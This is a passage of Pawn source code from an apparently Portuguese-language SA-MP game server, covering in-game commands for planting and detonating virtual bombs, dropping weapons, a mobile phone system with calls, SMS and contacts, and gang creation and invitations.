		            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui uma bomba c/ sensor aprox.");
					return 1;
		        }
		        
		        if(IsPlayerInAnyVehicle(playerid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não pode plantar uma bomba c/ sensor aprox. em um veículo.");
					return 1;
		        }
		        
                TakePlayerExplosive(playerid, 1);
                ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0, 1);
                obj = CreateObject(1252, X, Y, Z, 90.0, 90.0, A);
                SetTimerEx("ExplodeApproxBomb", 15000, false, "dfffd", obj, X, Y, Z, 0);
                SendClientMessage(playerid, COLOUR_RED, "Team, fall back!");
		        return 1;
		    }
		    
		    if(strcmp(exp, "bomba-remota", true) == 0)
		    {
		        if(RemoteBomb[playerid] != -1)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você já está com uma bomba remota plantada, use /explodir");
					return 1;
		        }
		        
		        if(GetPlayerExplosive(playerid, 2) == 0)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui uma bomba c/ sensor aprox.");
					return 1;
		        }

		        if(IsPlayerInAnyVehicle(playerid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não pode plantar uma bomba c/ sensor aprox. em um veículo.");
					return 1;
		        }

                TakePlayerExplosive(playerid, 2);
                ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0, 1);
                obj = CreateObject(1252, X, Y, Z, 90.0, 90.0, A);
                RemoteBomb[playerid] = obj;
                SendClientMessage(playerid, COLOUR_RED, "Bomba plantada, use /explodir");
		        return 1;
		    }
		    
		    if(strcmp(exp, "bomba-gas", true) == 0)
		    {
		        if(GetPlayerExplosive(playerid, 3) == 0)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui uma bomba de gás.");
					return 1;
		        }

		        if(IsPlayerInAnyVehicle(playerid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não pode plantar uma bomba de gás em um veículo.");
					return 1;
		        }

		        TakePlayerExplosive(playerid, 3);
		        ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0, 1);
		        obj = CreateObject(343, X, Y, Z, 0.0, 0.0, A);
		        SetTimerEx("GasEffect", 5000, false, "dfff", obj, X, Y, Z);
		        SendClientMessage(playerid, COLOUR_RED, "Need backup!");
		        return 1;
		    }
		    
		    if(strcmp(exp, "flash", true) == 0)
		    {
		        if(GetPlayerExplosive(playerid, 4) == 0)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui uma flash.");
					return 1;
		        }
		        
		        if(IsPlayerInAnyVehicle(playerid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não pode plantar uma flash em um veículo.");
					return 1;
		        }
		        
		        TakePlayerExplosive(playerid, 4);
		        ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0, 1);
		        obj = CreateObject(343, X, Y, Z, 0.0, 0.0, A);
		        SetTimerEx("FlashEffect", 5000, false, "dfff", obj, X, Y, Z);
		        SendClientMessage(playerid, COLOUR_RED, "Cover me!");
		        return 1;
		    }
		    
		    if(strcmp(exp, "rojao", true) == 0)
		    {
		        if(GetPlayerExplosive(playerid, 5) == 0)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui um rojão.");
					return 1;
		        }

		        if(IsPlayerInAnyVehicle(playerid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não pode plantar um rojão em um veículo.");
					return 1;
		        }
                
		        TakePlayerExplosive(playerid, 5);
		        ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0, 1);
		        obj = CreateObject(354, X, Y, Z, 0.0, 90.0, A);
		        SetTimerEx("RocketEffect", 8000, false, "dfffd", obj, X, Y, Z, 0);
		        SendClientMessage(playerid, COLOUR_RED, "Go go go!");
		        return 1;
		    }
		}

		SendClientMessage(playerid, COLOUR_GRAY, "USO: /plantar [bomba-relogio/bomba-aprox/bomba-remota/bomba-gas/flash/rojao]");
		return 1;
	}
	
	if(strcmp(cmd, "/explodir", true) == 0)
	{
	    new bombid;
		new Float:BX, Float:BY, Float:BZ;
	    
	    bombid = RemoteBomb[playerid];
	    
	    if(bombid == -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você deve plantar uma bomba-remota para explodi-la.");
			return 1;
	    }
	    
	    GetObjectPos(bombid, BX, BY, BZ);
		ExplodeBomb(bombid, BX, BY, BZ);
		RemoteBomb[playerid] = -1;
		SendClientMessage(playerid, COLOUR_RED, "CAAAAAAAAAAABBBBBBBBUUUUUUUUUUUMMMMMMMMMM!!!!!!!!!!");
		return 1;
	}
	
	if(strcmp(cmd, "/largararma", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar fora do veículo para largar a arma.");
			return 1;
	    }
	    
	    new gun[128];
		new Float:startX, Float:startY, Float:startZ, Float:X, Float:Y, Float:Z, Float:A;
	    
	    gun = strtok(cmdtext, idx);
	    
	    SavePlayerWeapons(playerid);
	    if(strlen(gun) > 0)
	    {
	        GetPlayerPos(playerid, startX, startY, startZ);
	        GetPlayerFacingAngle(playerid, A);
	        startX += 0.2 * floatsin(-A, degrees);
	        startY += 0.2 * floatcos(-A, degrees);
	        X = startX + 0.8 * floatsin(-A, degrees);
	        Y = startY + 0.8 * floatcos(-A, degrees);
	        Z = startZ - 0.95;
	        
	        if(strcmp(gun, "pesada", true) == 0)
	        {
	            if(pWeapons[playerid][0] <= 0 || pWeapons[playerid][0] >= sizeof Weapons || pWeapons[playerid][1] == 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não possui uma arma pesada.");
	                return 1;
	            }
	            
	            RemovePlayerAttachedObject(playerid, OBJECT_SLOT_HANDGUN);
	            
	            if(Weapons[pWeapons[playerid][0]][wObjectId] != 0)
	            {
	                new id;
	                
					id = CreateDroppedWeapon(pWeapons[playerid][0], pWeapons[playerid][1], startX, startY, startZ, 270.0, 0.0, float(random(360)));
					MoveObject(DroppedWeapons[id][dwObjectId], X, Y, Z, 4.1);
				}
				
				pWeapons[playerid][0] = pWeapons[playerid][1] = 0;
	        }
	        
	        else if(strcmp(gun, "leve", true) == 0)
	        {
	            if(pWeapons[playerid][2] <= 0 || pWeapons[playerid][2] >= sizeof Weapons || pWeapons[playerid][3] == 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não possui uma arma leve.");
	                return 1;
	            }
	            
	            if(Weapons[pWeapons[playerid][2]][wObjectId] != 0)
	            {
	                new id;

					id = CreateDroppedWeapon(pWeapons[playerid][2], pWeapons[playerid][3], startX, startY, startZ, 270.0, 0.0, float(random(360)));
					MoveObject(DroppedWeapons[id][dwObjectId], X, Y, Z, 4.1);
				}
				
				pWeapons[playerid][2] = pWeapons[playerid][3] = 0;
	        }
	        
	        else if(strcmp(gun, "branca", true) == 0)
	        {
	            if(pWeapons[playerid][4] <= 0 || pWeapons[playerid][4] >= sizeof Weapons)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não possui uma arma branca.");
	                return 1;
	            }
	            
	            if(Weapons[pWeapons[playerid][4]][wObjectId] != 0)
	            {
	            	new id;

					id = CreateDroppedWeapon(pWeapons[playerid][4], 1, startX, startY, startZ, 270.0, 0.0, float(random(360)));
					MoveObject(DroppedWeapons[id][dwObjectId], X, Y, Z, 4.1);
				}
				
				pWeapons[playerid][4] = 0;
	        }
	        
	        else
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "USO: /largararma [leve/pesada/branca]");
				return 1;
	        }
	        
	        pUpdate[playerid] |= UPDATE_WEAPONS;
	        ResetPlayerWeapons(playerid);
	        return 1;
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /largararma [leve/pesada/branca]");
		return 1;
	}
	
    if(strcmp(cmd, "/celular", true) == 0)
	{
	    new phone_cmd[128];
		new phone;
	    
	    phone = GetPlayerPhone(playerid);
	    
	    if(phone == 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui celular.");
	        return 1;
	    }
	    
	    phone_cmd = strtok(cmdtext, idx);

	    if(strlen(phone_cmd) > 0)
	    {
	        if(strcmp(phone_cmd, "ligar", true) == 0)
	        {
	            if(Call[playerid] != 0)
				{
					SendClientMessage(playerid, COLOUR_GRAY, "Você deve finalizar a chamada para prosseguir.");
					return 1;
				}
		
	            new dest[128], string[128], name[128], number[128], display1[128], display2[128];
	            new id, contact;
	            new bool:colect;
	            
	            dest = strtok(cmdtext, idx);
	            
	            if(!strlen(dest))
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular ligar [nome/numero]");
					return 1;
	            }
	            
	            if(IsNumeric(dest))
	            {
                    display1 = dest;
                    
                    if(strcmp(dest, "9090", true, 4) == 0)
                    {
                        strmid(dest, dest, 4, strlen(dest));
						colect = true;
                    }
                    
				    contact = 0;
					while(GetPlayerContact(playerid, contact, name, number) != -1)
				    {
				        if(strcmp(number, dest, true) == 0)
				        {
							display1 = name;
							break;
				        }

				        contact++;
				    }
	            }
	            
				else
				{
				    new bool:found;
				    
				    if(strcmp(dest, "cobrar", true) == 0)
				    {
				        dest = strtok(cmdtext, idx);
				        
				        if(IsNumeric(dest))
	            		{
	                		SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular ligar cobrar [nome]");
							return 1;
	            		}
	            
				        colect = true;
				    }
				    
				    contact = 0;
					found = false;
					while(GetPlayerContact(playerid, contact, name, number) != -1)
				    {
				        if(strcmp(name, dest, true) == 0)
				        {
							dest = number;
							found = true;
							break;
				        }
				        
				        contact++;
				    }
				    
				    if(!found)
				    {
				        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui este contato na sua agenda.");
						return 1;
				    }
				    
				    display1 = dest;
				}
				
				if(!strlen(GetPhoneOwner(dest)))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Número inexistente.");
					return 1;
				}
				
				id = GetPhoneId(dest);
				
				if(id == playerid)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode ligar para o próprio celular.");
					return 1;
				}
				
				valstr(display2, phone);
				contact = 0;
				while(GetPlayerContact(playerid, contact, name, number) != -1)
	    		{
	       			if(strcmp(number, dest, true) == 0)
   					{
						display1 = name;
						break;
       				}

					contact++;
				}
				    
				format(string, sizeof string, "[ Chamando %s... ]", display1);
				SendClientMessage(playerid, COLOUR_WHITE,  string);
				SetPlayerCellPhoneAction(playerid);
				
				if(id == INVALID_PLAYER_ID)
				{
				    SetTimerEx("PhoneCallError", 4000, false, "dd", playerid, 1);
					return 1;
				}
				
				if(hGetInt(GetPlayerXFilePath(playerid), "Credits") <= 0 && !colect)
				{
                    SetTimerEx("PhoneCallError", 4000, false, "dd", playerid, 2);
					return 1;
				}
				
				if(hGetInt(GetPlayerXFilePath(id), "Credits") <= 0 && colect)
				{
                    SetTimerEx("PhoneCallError", 4000, false, "dd", playerid, 3);
					return 1;
				}
				
				if(Call[id] != 0)
				{
				    SetTimerEx("PhoneCallError", 4000, false, "dd", playerid, 4);
					return 1;
				}

				Call[id] = (playerid << 2) & ~3;
				CallTimer[playerid] = SetTimerEx("PhoneCallStop", 20000, false, "dd", playerid, id);
				TextDrawShowForPlayer(id, tdphone);
				
				if(!colect)
					format(string, sizeof string, "[ %s chamando... uso /celular atender/recusar ]", display2);

				else
				{
				    Call[id] |= 2;
				    format(string, sizeof string, "[ %s chamando à cobrar... uso /celular atender/recusar ]", display2);
				}
				
				SendClientMessage(id, COLOUR_WHITE, string);
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "atender", true) == 0)
	        {
	            new callerid, payerid;
	            
				if(Call[playerid] & 0x1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está recebendo nenhuma ligação.");
					return 1;
				}
				
				callerid = Call[playerid] >> 2;
				
				if(!IsPlayerConnected(callerid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está recebendo nenhuma ligação.");
					return 1;
				}
				
				if(Call[playerid] & 2)
				    payerid = playerid;
				    
				else
				    payerid = callerid;
				
				DeleteTimer(CallTimer[callerid]);
				Call[playerid] |= 1;
				Call[callerid] |= (playerid << 2) | 1;
				CallCost[payerid] = 5;
				CallTimer[payerid] = SetTimerEx("PhoneCall", 60000, true, "d", payerid);
				SetPlayerCellPhoneAction(playerid);
				TextDrawHideForPlayer(playerid, tdphone);
				SendClientMessage(playerid, COLOUR_WHITE, "[ Chamada aceita ]");
				SendClientMessage(callerid, COLOUR_WHITE, "[ Chamada aceita ]");
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "recusar", true) == 0)
	        {
	            new callerid;

				if(Call[playerid] & 0x1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está recebendo nenhuma ligação.");
					return 1;
				}

				callerid = Call[playerid] >> 2;

				if(!IsPlayerConnected(callerid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está recebendo nenhuma ligação.");
					return 1;
				}

                DeleteTimer(CallTimer[callerid]);
				Call[playerid] = 0;
				Call[callerid] = 0;
				StopPlayerCellPhoneAction(callerid);
				TextDrawHideForPlayer(playerid, tdphone);
				SendClientMessage(playerid, COLOUR_WHITE, "[ Chamada recusada ]");
				SendClientMessage(callerid, COLOUR_WHITE, "[ Chamada recusada ]");
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "sms", true) == 0)
	        {
	            if(Call[playerid] != 0)
				{
					SendClientMessage(playerid, COLOUR_GRAY, "Você deve finalizar a chamada para prosseguir.");
					return 1;
				}
				
                new text[256], xpath[128], dest[128], string[128], name[128], number[128], display1[128], display2[128], pname[128];
	            new contact, credits;

	            dest = strtok(cmdtext, idx);

	            if(!strlen(dest))
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular sms [nome/numero] [texto]");
					return 1;
	            }

                strmid(text, cmdtext, idx, strlen(cmdtext));

                if(!strlen(text))
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular sms [nome/numero] [texto]");
					return 1;
	            }
	            
	            if(IsNumeric(dest))
	            {
                    display1 = dest;
				    contact = 0;
					while(GetPlayerContact(playerid, contact, name, number) != -1)
				    {
				        if(strcmp(number, dest, true) == 0)
				        {
							display1 = name;
							break;
				        }

				        contact++;
				    }
	            }

				else
				{
				    new bool:found;
				    
				    contact = 0;
					found = false;
					while(GetPlayerContact(playerid, contact, name, number) != -1)
				    {
				        if(strcmp(name, dest, true) == 0)
				        {
							dest = number;
							found = true;
							break;
				        }

				        contact++;
				    }

				    if(!found)
				    {
				        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui este contato na sua agenda.");
						return 1;
				    }

				    display1 = dest;
				}

				pname = GetPhoneOwner(dest);
				
				if(!strlen(pname))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Número inexistente.");
					return 1;
				}

				xpath = GetPlayerXFilePath(playerid);
				credits = hGetInt(xpath, "Credits") - 2;

				if(credits < 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não possui créditos para enviar uma SMS. Mínimo: $2,00 dólares");
					return 1;
				}

				valstr(display2, phone);
				contact = 0;
				while(GetPlayerContact(playerid, contact, name, number) != -1)
	    		{
	       			if(strcmp(number, dest, true) == 0)
   					{
						display1 = name;
						break;
       				}

					contact++;
				}
				
				format(text, sizeof text, "[ %s ]", text);
				SendPhoneMessage(pname, display2, text);
				format(string, sizeof string, "[ SMS enviada para %s ]", display1);
				SendClientMessage(playerid, COLOUR_WHITE, string);
				format(string, sizeof string, "[ Foram gastos $2,00 dólares em créditos. Total: $%d,00 dólares ]", credits);
			    SendClientMessage(playerid, COLOUR_WHITE, string);
				hSetInt(xpath, "Credits", credits);
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "desligar", true) == 0)
	        {
	            new xpath[128], string[128];
                new callerid, payerid, credits;

				if(Call[playerid] & 0x1 == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma chamada.");
					return 1;
				}

                callerid = Call[playerid] >> 2;
                
				if(CallCost[playerid] > 0)
				    payerid = playerid;
				    
				else
				    payerid = callerid;
				    
				xpath = GetPlayerXFilePath(payerid);
				credits = hGetInt(xpath, "Credits") - CallCost[payerid];
				Call[playerid] = 0;
				Call[callerid] = 0;
				SendClientMessage(playerid, COLOUR_WHITE, "[ Chamada finalizada ]");
				SendClientMessage(callerid, COLOUR_WHITE, "[ Chamada finalizada ]");
				StopPlayerCellPhoneAction(playerid);
				StopPlayerCellPhoneAction(callerid);
				
				if(credits < 0)
				    credits = 0;

                hSetInt(xpath, "Credits", credits);
    			format(string, sizeof string, "[ Foram gastos $%d,00 dólares em créditos. Total: $%d,00 dólares ]", CallCost[payerid], credits);
			    SendClientMessage(payerid, COLOUR_WHITE, string);
			    CallCost[payerid] = 0;
				DeleteTimer(CallTimer[payerid]);
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "adicionar", true) == 0)
	        {
				new name[128], number[128], na[128], nu[128], string[128];
				new contact;
				
				name = strtok(cmdtext, idx);
				
				if(!strlen(name))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular adicionar [nome] [numero]");
					return 1;
				}
				
				number = strtok(cmdtext, idx);

				if(!strlen(number))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular adicionar [nome] [numero]");
					return 1;
				}
				
				if(!IsNumeric(number))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Use apenas números (0-9) para escrever o número.");
					return 1;
				}
				
				contact = 0;
				while(GetPlayerContact(playerid, contact, na, nu) != -1)
	    		{
        			if(strcmp(name, na, true) == 0)
    				{
    				    SendClientMessage(playerid, COLOUR_GRAY, "Já há um contato com este nome em sua lista.");
						return 1;
       				}
       				
       				if(strcmp(number, nu, true) == 0)
    				{
                        SendClientMessage(playerid, COLOUR_GRAY, "Já há um contato com este número em sua lista.");
						return 1;
       				}

					contact++;
				}
				    
				SetPlayerContact(playerid, contact, name, number);
				format(string, sizeof string, "[ Contato adicionado -> Nome: %s - Número: %s ]", name, number);
				SendClientMessage(playerid, COLOUR_WHITE, string);
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "apagar", true) == 0)
	        {
				new contact[128], name[128], number[128], string[128];
				new id, res;
				
				contact = strtok(cmdtext, idx);
				
				if(!strlen(contact))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular apagar [nome/número]");
				    return 1;
				}
				
				res = -1;
				id = 0;
				while(GetPlayerContact(playerid, id, name, number) != -1)
				{
				    if(strcmp(contact, name, true) == 0 || strcmp(contact, number, true) == 0)
				    {
				        res = id;
				        break;
				    }
				    
				    id++;
				}
				
				if(res == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Contato inexistente.");
				    return 1;
				}
				
				format(string, sizeof string, "[ Contato removido -> Nome: %s - Número: %s ]", name, number);
				while(GetPlayerContact(playerid, res + 1, name, number) != -1)
				{
				    SetPlayerContact(playerid, res, name, number);
				    res++;
				}
				
				SetPlayerContact(playerid, res, "\0", "\0");
				SendClientMessage(playerid, COLOUR_WHITE, string);
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "contatos", true) == 0)
	        {
	            new name[128], number[128], string[128];
				new list, nof_contacts;
				
				list = strval(strtok(cmdtext, idx));
				
				if(list < 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular contatos [lista] - Lista acima de 0");
					return 1;
				}
				
				format(string, sizeof string, "[Lista %d] Nome - Número", list);
				SendClientMessage(playerid, COLOUR_PURPLE, string);
				nof_contacts = 0;
				list = list * 8;
				
				for(new contact = list - 8; contact < list; contact++)
				{
					if(GetPlayerContact(playerid, contact, name, number) == -1)
					    break;
					    
                    nof_contacts++;
					format(string, sizeof string, "[ %d ] %s - %s", contact + 1, name, number);
					SendClientMessage(playerid, COLOUR_WHITE, string);
				}
				
				if(nof_contacts <= 0)
				    SendClientMessage(playerid, COLOUR_WHITE, "Lista vazia.");
				
				else
				{
					format(string, sizeof string, "[INFO] %d contatos encontrados nessa lista.", nof_contacts);
					SendClientMessage(playerid, COLOUR_WHITE, string);
				}
				
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "ver", true) == 0)
	        {
	            new File:mfile;
				new mpath[128], data[128], text[128];
				new message, count;
				new bool:done;
				
				mpath = GetPlayerMFilePath(playerid);
				
				if(!fexist(mpath))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Nenhuma mensagem foi encontrada.");
				    return 1;
				}
				
				message = strval(strtok(cmdtext, idx));
				
				if(message < 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular ver [mensagem] - Mensagem acima de 0");
				    return 1;
				}
				
				mfile = fopen(mpath, io_read);
				
				done = false;
				count = 1;
				while(fread(mfile, data, sizeof data))
				{
				    if(fread(mfile, text, sizeof text))
				    {
				    	if(count == message)
				    	{
				    	    SendClientMessage(playerid, COLOUR_PURPLE, data);
				    	    SendClientMessage(playerid, COLOUR_WHITE, text);
				    	    done = true;
				    	    break;
				    	}
					}
					
				    ++count;
				}
				
				fclose(mfile);
				
				if(!done)
				    SendClientMessage(playerid, COLOUR_GRAY, "Nenhuma mensagem foi encontrada.");
				    
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "excluir", true) == 0)
	        {
	            new File:mwfile, File:mrfile;
				new mpath[128], mpath_buf[128], tmp[128];
				new message, count;
				new bool:done;
				
				mpath = GetPlayerMFilePath(playerid);
				tmp = strtok(cmdtext, idx);
				
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular excluir [mensagem/todas]");
				    return 1;
				}
				
				if(!fexist(mpath))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Nenhuma mensagem foi encontrada.");
				    return 1;
				}
				
				if(strcmp(tmp, "todas", true) == 0)
				{
				    fremove(mpath);
				    SendClientMessage(playerid, COLOUR_WHITE, "[ Todas as suas mensagens foram excluídas ]");
				    return 1;
				}
				
				message = strval(tmp);
				
				if(message < 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Número da mensagem acima de 0.");
				    return 1;
				}
				
				format(mpath_buf, sizeof mpath_buf, "%s.buf", mpath);
				mwfile = fopen(mpath_buf, io_write);
				mrfile = fopen(mpath, io_read);
				
				done = false;
				count = 1;
				while(fread(mrfile, tmp, sizeof tmp))
				{
				    if(!done && count != message)
				    {
				        fwrite(mwfile, tmp);
				        done = true;
					}
					
					++count;
				}
				
				fclose(mwfile);
    			fclose(mrfile);
    			
    			if(!done)
				{
				    fremove(mpath_buf);
				    SendClientMessage(playerid, COLOUR_GRAY, "Nenhuma mensagem foi encontrada.");
				}
				
				else
				{
				    if(fcopytextfile(mpath_buf, mpath))
						fremove(mpath_buf);
						
                    SendClientMessage(playerid, COLOUR_WHITE, "[ Mensagem excluída ]");
				}
				
				return 1;
	        }
	        
	        else if(strcmp(phone_cmd, "info", true) == 0)
	        {
	            new File:mfile;
	            new xpath[128], mpath[128], string[128];
	            new credits, messages;
	            
	            xpath = GetPlayerXFilePath(playerid);
	            mpath = GetPlayerMFilePath(playerid);
	            credits = hGetInt(xpath, "Credits");
	            
	            if(fexist(mpath))
	            {
	            	mfile = fopen(mpath, io_read);
	            
	            	while(fread(mfile, string, sizeof string))
						++messages;

					fclose(mfile);
				}
				
	            format(string, sizeof string, "[ Número: %d ]", phone);
	            SendClientMessage(playerid, COLOUR_WHITE, string);
	            format(string, sizeof string, "[ Créditos: $%d,00 dólares = %dmins em chamadas ]", credits, credits / 5);
	            SendClientMessage(playerid, COLOUR_WHITE, string);
	            format(string, sizeof string, "[ Mensagens: %d mensagens encontradas ]", messages);
	            SendClientMessage(playerid, COLOUR_WHITE, string);
	            return 1;
	        }
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /celular [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "ligar, atender, recusar, sms, desligar, adicionar, apagar, contatos");
	    SendClientMessage(playerid, COLOUR_GRAY, "ver, excluir, info");
	    return 1;
	}
	
	if(strcmp(cmd, "/gangue", true) == 0)
	{
	    new gang_cmd[128];
	    
	    gang_cmd = strtok(cmdtext, idx);
	    
	    if(strlen(gang_cmd) > 0)
	    {
	        if(strcmp(gang_cmd, "criar", true) == 0)
	        {
                new xpath[128], gname[128], colour[128], string[128];
				new gcolour, id, post;

                xpath = GetPlayerXFilePath(playerid);

			    if(!IsPlayerAdmin(playerid) && hGetInt(xpath, "Level") < MIN_LEVEL_CREATE_GANG)
				{
					format(string, sizeof string, "Você não tem level o suficiente para criar uma gangue (Mínimo: %d)", MIN_LEVEL_CREATE_GANG);
					SendClientMessage(playerid, COLOUR_GRAY, string);
					return 1;
				}
				
				GetPlayerGangData(playerid, id, post);

				if(id != 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você já está em uma gangue.");
        			return 1;
				}
				
    	        gcolour = -1;
				colour = strtok(cmdtext, idx);

				if(strlen(colour) > 0)
				{
			    	for(new c = 0; c < sizeof GangColours; c++)
			    	{
				        if(strcmp(GangColours[c][gColourName], colour, true) == 0)
			    	    {
			    	        gcolour = c;
				            break;
				        }
				    }
				}

				if(gcolour == -1)
				{
			    	SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue criar [cor] [nome] - CORES DISPONÍVEIS:");
			    	SendClientMessage(playerid, COLOUR_GRAY, "branco, preto, vermelho, vermelho-escuro, verde, verde-claro, verde-escuro");
				    SendClientMessage(playerid, COLOUR_GRAY, "azul, azul-claro, azul-escuro, azul-ceu, navy, aqua, ciano, magenta, amarelo");
				    SendClientMessage(playerid, COLOUR_GRAY, "cinza, laranja, rosa, dourado, roxo, marrom");
	    	        return 1;
				}

				strmid(gname, cmdtext, idx, strlen(cmdtext));

				if(!strlen(gname))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue criar [cor] [nome]");
		            return 1;
				}

				if(!IsNotSpecialString(gname))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Use apenas os caracteres \"A-Z, a-z, 0-9, ', espaço ou _\" no nome da gangue.");
		            return 1;
				}

				CreateGang(gname, playerid, gcolour);
				SendClientMessage(playerid, COLOUR_SKY_BLUE, "Gangue criada.");
				return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "excluir", true) == 0)
	        {
	            new id, post;

				GetPlayerGangData(playerid, id, post);

				if(id == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
        			return 1;
				}

				if(post != GANG_POST_LEADER)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o líder da sua gangue.");
        			return 1;
				}

				DeleteGang(id);
				SendClientMessage(playerid, COLOUR_SKY_BLUE, "Gangue excluida.");
				return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "convidar", true) == 0)
	        {
	            new tmp[128], string[128];
	            new plid, id, post;
	            new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
	            
	            GetPlayerGangData(playerid, id, post);
				
				if(id == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
	            	return 1;
				}
	            
	            if(post != GANG_POST_LEADER && post != GANG_POST_SWORD_ARM && post != GANG_POST_TOWER)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é líder, braco direito nem torre da sua gangue.");
	            	return 1;
				}
	            
	            tmp = strtok(cmdtext, idx);
	            
	            if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue convidar [id]");
				    return 1;
				}
				
				plid = strval(tmp);
				
				if(!IsPlayerConnected(plid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	            	return 1;
				}
				
				if(plid == playerid)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode se auto-convidar.");
				    return 1;
				}
				
				if(GetPlayerGang(plid) != 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já está em uma gangue.");
				    return 1;
				}
				
				GetPlayerPos(playerid, X, Y, Z);
				GetPlayerPos(plid, PX, PY, PZ);

				if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Chegue mais perto do jogador.");
				    return 1;
				}
				
				format(string, sizeof string, "Deseja entrar na gangue %s?", hGetString(GetGangFilePath(id), "Name"));
				
				if(!SendPlayerInvite(plid, playerid, id, INVITE_GANG, "Gangues:", string, "Sim", "Nao"))
					SendClientMessage(playerid, COLOUR_SKY_BLUE, "Proposta de gangue enviada.");
					
				return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "definircargo", true) == 0)
	        {
				new tmp[128], string[128];
				new plid, post, id, gangid, postid, xpostid;

				GetPlayerGangData(playerid, gangid, postid);
				
				if(gangid == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
	            	return 1;
				}
				
				if(postid != GANG_POST_LEADER && postid != GANG_POST_SWORD_ARM && postid != GANG_POST_TOWER)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é líder, braco direito nem torre da sua gangue.");
	            	return 1;
				}
				
				tmp = strtok(cmdtext, idx);
				
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue definircargo [id] [cargo]");
				    return 1;
				}
				
				plid = strval(tmp);
				
				if(!IsPlayerConnected(plid))
				{
